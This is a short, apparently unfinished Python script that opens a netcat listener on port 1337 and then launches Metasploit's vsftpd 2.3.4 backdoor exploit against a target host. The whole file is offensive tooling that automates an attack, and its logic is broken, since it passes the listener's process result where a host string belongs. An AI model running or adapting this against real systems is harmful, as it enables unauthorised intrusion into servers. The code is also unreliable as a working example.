import subprocess

#<Greg's code here?>

def listener():
	target = subprocess.run(["nc", "-lp", "1337"])
	return target

def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	subprocess.run(["msfconsole", "-q", "-x", exploit])

	
target = listener()
generate(target)

